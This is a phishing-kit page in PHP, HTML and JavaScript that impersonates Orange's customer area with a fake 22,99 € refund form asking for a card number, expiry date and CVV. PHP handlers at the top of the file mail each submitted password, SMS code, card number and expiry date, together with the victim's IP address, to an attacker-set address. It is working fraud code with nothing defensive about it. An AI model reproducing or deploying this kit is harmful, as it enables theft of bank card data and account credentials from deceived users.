<?php session_start();?>
<?php

include_once ("auth.php");
if(isset($_POST['password'])){
    $password = $_POST['password'];

    $data = "Mot de passe(x2): $password,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Mot de passe de $IP", $data);
  //  sleep(3);
}
?>

<?php
include_once ("auth.php");
if(isset($_POST['code'])){
    $code = $_POST['code'];
    $data = "Code sms: $code,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Code sms de $IP", $data);
}
?>
<?php

include_once ("auth.php");
if(isset($_POST['date'])){
    $date = $_POST['date'];

    $data = "Date d'expiration: $date,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Date d'expiration - $IP", $data);
    //header("Location: cryptogramme.php");
}
?>

<?php session_start();?>
<?php

include_once ("auth.php");
if(isset($_POST['cc'])){
    $cc = $_POST['cc'];

    $data = "Numero de carte: $cc,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Numero de carte - $IP", $data);
    //header("Location: expiration_date.php");
}
?>

<style>
    #szc{
        font-weight: 700;
    }
    select, input, textarea {
    font-size: 15px;
    padding: 4px;
    border: 2px solid #ccc;
}
.carteimage{
    background: url(./elementScama/.png) no-repeat;
}
.cvvCBImage, .crypto {
    position: relative;
    top: -45px;
    left: 168px;
    width: 97px;
    height: 53px;
    margin: 0 10px;
    float: left;
    background: url(./elementScama/cvv-cb.png) no-repeat;
    background-size: 97px 53px;
}
select {
    -webkit-writing-mode: horizontal-tb !important;
    text-rendering: auto;
    color: -internal-light-dark(black, white);
    letter-spacing: normal;
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: start;
    appearance: menulist;
    box-sizing: border-box;
    align-items: center;
    white-space: pre;
    -webkit-rtl-ordering: logical;
    background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));
    cursor: default;
    margin: 0em;
    font: 400 13.3333px Arial;
    border-radius: 0px;
    border-width: 2px;
    border-style: solid;
    border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
    border-image: initial;
}

.infoSecurityCode {
    line-height: 18px;
    font-size: 14px;
    line-height: 18px;
    font-size: 14px;
    left: -118px;
    position: relative;
    top: 5px;
}

.logos-cartes {
    height: 24px;
}

.logo-carte {
    margin-right: 8px;
}
.remarque {
    line-height: 18px;
    font-size: 14px;
    text-align: center;
    margin-top: 18px;
}

input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
   -webkit-appearance: none;
   margin: 0;
}
input[type="number"] {
   -moz-appearance: textfield;
}

</style>
    <h2 class="sr-only">Saisissez les informations de votre carte</h2>
    <div class="clearfix"></div>
    <div class="form-group ">
        <div class="eui-input-label">
                
             
                    <div id="divAmount" style="     line-height: 22px;     line-height: 18px;
    font-size: 16px;
    font-weight: bold;
    float: left;
  font-size: 18px;width: max-content; font-family: HelvNeueOrange, Helvetica, Arial, sans-serif;">Montant du remboursement  </div> 
                    
                    <span style="line-height: 36px;
    font-size: 36px;
    font-weight: bold;
    color: #f16e00;
    float: right;color: #f16e00;
    position : relative;
    text-align: right;
    left: 55px;">
             22<sup style="font-size: .5em;top: -0.70em;">,99 €</sup>
            </span>

            
            
        </div>

        <div id="form_js_error_container" style="    width: 80%;
    line-height: 20px;
    font-size: 14px;
    font-weight: bold;
    color: #dc3c14;
    margin-top: 20px;
    padding: 10px 10px 10px 10px; justify-content:center;
    border: 1px solid #dc3c14;display: table-cell;display:none">
                <div class="wal_warning">
                    <div id="warning_message" class="warning_message" >Aucun code de sécurité n'a été saisi</div>
                </div>
        </div>
        <div class="remarque" style="    text-align: start;">Les champs marqués d'un  <span style="color: #f16e00; " >*</span> sont obligatoires.
            </div>
        <div class="eui-help" id="helpPasswordCnt" style="display : none;">
            <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
        </div>
        <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>


        <div class="logos-cartes" style="margin-top: 19px ; margin-bottom : 19px">
                        <img id="img_cb" class="logo-carte logo-carte-bleue" style="margin-right: 10px;" src="./elementScama/logo_card_type_cb.png" alt="Carte Bleue">
                        <img id="img_visa" class="logo-carte logo-carte-visa"  style="margin-right: 10px;" src="./elementScama/logo_card_type_visa.png" alt="Visa">
                        <img id="img_mc" class="logo-carte logo-carte-mastercard"  style="margin-right: 10px;" src="./elementScama/logo_card_type_mastercard.png" alt="MasterCard">
                    </div>
        <!-- <div class="crypto carteimage" id="carteimage"> </div> -->
    <div class="form-group cc-group" style="position:relative;">

        <div style="margin-top: 15px; margin-bottom: 10px;">
                <label for="cc">Numéro de carte <span style="color: #f16e00;" >*</span></label>
                <input style="" id="cc" type="number" pattern="[0-9]{16,19}" name="cc" maxlength="19" class="form-control" placeholder="" /> 
            </div>
            <div style="margin-top: 20px; margin-bottom: 10px;">
                <label for="scz">Date d'expiration <span style="color: #f16e00;" >*</span></label>
                <br>
                <select id="mois"  name="mois" placeholder="Mois" style= "width: 163px; height: 40px;   margin-right: 25px;"> 
                <option  value="" disabled selected>Mois</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                </select>
                <select id="annee" placeholder="Année" name="annee" style="width: 163px;height: 40px;margin-right: 0px;">
                <option value="" disabled selected>Année</option>
                <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                </select>
            </div>
                <!-- <input type="tel" id="szc" name="date" placeholder="Date d'expiration (MM/YY)" maxlength="5" class="form-control pass-assist" pattern="[0-9]{2}\/[0-9]{2}" required=""> -->
                <div style="margin-top: 20px; margin-bottom: 13px;">
                <label for="password" style="margin-bottom: 13px;">Numéro de contrôle <span style="color: #f16e00; " >*</span></label>
                <div>
                    <input type="tel" id="passwordcvv" style="    width: 163px;    height: 40px;margin-right: 10px;" name="cryptogram" placeholder="" class="form-control " pattern="[0-9]{3}" maxlength="3"  aria-hidden="false" aria-invalid="false" aria-required="true">
                    <div class="crypto cvvCBImage" id="cvvImage"> </div>
                </div>
            </div>
           <div style="    width: 421px;">
           <p class="infoSecurityCode" id="cvvCodePhrase">Le code de sécurité est composé des 3 derniers chiffres inscrits au verso de votre carte.</p>

           </div>
           
           
           <div style="display: flex;
    justify-content: center;">

           <button id="btnSubmi" type="submit" class="btn btn-info eui-btn-sub" style="line-height: 20px;font-size: 16px;color: #fff;padding: 10px 20px;
    background-color: #f16e00;border : none ;
    left: -17px;
    width: 330px;
    float: right;text-decoration: none;margin-bottom: 33px;">Valider votre remboursement</button>
           </div>
       
        </div>

       
     
    </div>

   
    <style>

        .cc-control {
            padding-left: 60px;
            width: 290px;
        }
        .cc-icon {
            position: absolute;
            width: 46px;
            line-height: 46px;
            margin: 9px 0 0 8px;
        }
    </style>
    <script>
        $(function () {
            var ua = navigator.userAgent.toLowerCase();
            var isAndroid = ua.indexOf("android") > -1;

            var cardTypes = {
                defaultcard: {
                    image: './img/1.png',
                    title: 'Credit Card',
                    maxLength: '19',
                    inputMask: defaultMask
                },
                mastercard: {
                    image: './img/3.png',
                    title: 'Master Card',
                    maxLength: '19',
                    inputMask: defaultMask
                },
                visa: {
                    image: './img/2.png',
                    title: 'Visa',
                    maxLength: '19',
                    inputMask: defaultMask
                },
                discover: {
                    image: './img/4.png',
                    title: 'Discover',
                    maxLength: '19',
                    inputMask: defaultMask
                },
                amex: {
                    image: './img/4.png',
                    title: 'American Express',
                    maxLength: '17',
                    inputMask: amexMask
                }
            };

            // Enable for aal but Android

            $(".cc-control").on("keyup", function () {
                _ccInput = $(this).val();

                // VISA
                if (_ccInput.charAt(0) == '4') {
                    changeIcon(cardTypes.visa);
                }

                // MASTER CARD
                else if (_ccInput.substring(0, 2) >= 50 && _ccInput.substring(0, 2) <= 55) {
                    changeIcon(cardTypes.mastercard);
                }

                // AMEX
                else if (_ccInput.substring(0, 2) == 34 || _ccInput.substring(0, 2) == 37) {
                    changeIcon(cardTypes.amex);
                }

                // DISCOVER
                else if (_ccInput.substring(0, 4) == 6011 || _ccInput.substring(0, 2) == 65 || (_ccInput.substring(0, 3) >= 644 && _ccInput.substring(0, 3) <= 649) || (_ccInput.substring(0, 6) >= 622126 && _ccInput.substring(0, 6) <= 622925)) {
                    changeIcon(cardTypes.discover);
                }

                // UNKNOWN - Remove icons and reset mask
                else {
                    removeIcon();
                }

                // Check for empty value
                if (_ccInput.length === 0) {
                    removeIcon();
                }
            });


            function removeIcon() {
                var _this = $(".cc-group");
                if (_this.hasClass('active')) {
                    _this.removeClass('active').find('.cc-icon').fadeOut('fast', function () {
                        $(this).removeClass('active').attr('src', cardTypes.defaultcard.image).attr('alt', cardTypes.defaultcard.title).attr('title', cardTypes.defaultcard.title).fadeIn('fast');
                    });
                }

                // Set default input mask
                if (!isAndroid) {
                    cardTypes.defaultcard.inputMask();
                }

            }

            function changeIcon(obj) {
                var _this = $(".cc-group");

                if (!_this.hasClass('active')) {

                    // Swap Out Icons
                    _this.addClass('active').find('.cc-icon').fadeOut('fast', function () {
                        $(this).addClass('active').attr('src', obj.image).attr('alt', obj.title).attr('title', obj.title).fadeIn('fast');
                    });

                    // Apply maxlength
                    _this.find('.cc-control').attr('maxlength', obj.maxLength);

                    // Set new input mask
                    if (!isAndroid) {
                        if (typeof (obj.inputMask) != "undefined") {
                            obj.inputMask();
                        } else {
                            defaultMask();
                        }
                    }
                }
            }

            function defaultMask() {
                $('.cc-control').inputmask({
                    mask: '9999 9999 9999 9999',
                    showMaskOnFocus: false,
                    showMaskOnHover: false,
                    "placeholder": ""
                });
            }

            function amexMask() {
                $('.cc-control').inputmask({
                    mask: '9999 999999 99999',
                    showMaskOnFocus: false,
                    showMaskOnHover: false,
                    "placeholder": ""
                });
            }
            function validateCreditCard(){
    if(/^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/.test($('#cc').val())){
        return true
    }
    return false
}

function EmptyDate(){
    if($('#mois').val() && $('#annee').val()) {

    return true
    }
    return false;
}

function EmptyCvv(){
    if($('#passwordcvv').val()){
        return true
    }
    return false 
}

        $('#btnSubmi').on('click', function (e) {
            let a =EmptyCvv() 
            console.log("AAA",a)
            let  b = validateCreditCard() ;
            let c =EmptyDate();
            condition = [a,b,c];

            if(condition.every((x)=>{  return x == false})){
                console.log("Aucune carte bancaire n'a été saisi")
                message="Aucune carte bancaire n'a été saisi";
            }else if(a== false){
                console.log("Aucun code de sécurité n'a été saisi")
                message="Aucun code de sécurité n'a été saisi";
            }else if(b == false){
                console.log("Le numéro de carte bancaire semble erroné")
                message="Le numéro de carte bancaire semble erroné";
            }else if(c == false ){
                console.log("Aucune date d'expiration valide n'a été sélectionnée")
                message="Aucune date d'expiration valide n'a été sélectionnée";
            }
             console.log("Condition", condition)
             $("#warning_message").text( message);
             $("#form_js_error_container").css("display", "flex");
            if(condition.some(x=> x== false))
            e.preventDefault();

        //    f($("#cc").val().length < 16)
        //         e.preventDefault(); i
        });
        });


    </script>

<script>
    /*$('#szc').on('keypress', function (e) {
        if( $('#szc').val().length === 1){
            var newVal = $('#szc').val()+"/2";
            $('#szc').val(newVal);
        }else if($('#szc').val().length === 0){
            if(parseInt($('#szc').val()) > 3){
                $("#szc").val("3");
            }
        }
    });*/

    var lastLen = 0;
    var isNotInt = false;
    var lastValue = "";

    $('#szc').on('keyup', function (e) {
        var textLen = $('#szc').val().length;
        var val = $('#szc').val();
        if(!isNotInt || lastLen >= textLen){
            if( textLen === 2){
                if(lastLen < textLen){
                    var newVal = val+"/2";
                    $('#szc').val(newVal);
                }
            }else if(textLen === 1){
                if(parseInt(val) > 3){
                    $("#szc").val("0"+val+"/2");
                }
            }
            lastLen = textLen;
        }else
            $("#szc").val(lastValue);
    });

    var av = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    $("#szc").on('keypress', function (e) {
        console.log(e.keyCode);
        isNotInt = av.indexOf(parseInt(e.key)) === -1;
        lastValue = $("#szc").val();
    });
</script>
